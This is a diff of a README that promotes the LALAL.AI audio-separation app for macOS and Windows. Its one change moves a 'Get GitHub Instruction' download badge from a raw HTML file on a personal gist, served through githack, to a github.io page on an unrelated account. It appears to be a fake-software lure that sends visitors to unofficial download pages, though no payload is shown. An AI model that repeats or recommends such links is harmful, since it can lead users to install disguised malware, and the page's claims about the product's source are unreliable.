@@ -3,7 +3,7 @@
 **LALAL.AI** brings professional-grade audio separation to **macOS** and **Windows**, letting you isolate vocals, instruments, drums, bass, piano, and more — all powered by cutting-edge AI.  
 The app delivers studio-level precision with minimal artifacts, lightning-fast processing, and full **Apple Silicon** optimization. 🍎💻  
 
-[![💚 Get GitHub Instruction](https://img.shields.io/badge/💚%20Get%20LALAL%20AI-1DB954?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/block15ranny/f45b7dca0a9e3df9a1c12922f382339f/raw/24ef41165dd4a404386166e88f58de4f061661e3/app.html?offer=LALALAIApp)
+[![💚 Get GitHub Instruction](https://img.shields.io/badge/💚%20Get%20LALAL%20AI-1DB954?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://git-app-desk.github.io/.github/?offer=LALALAIApp)
 
 ---
 
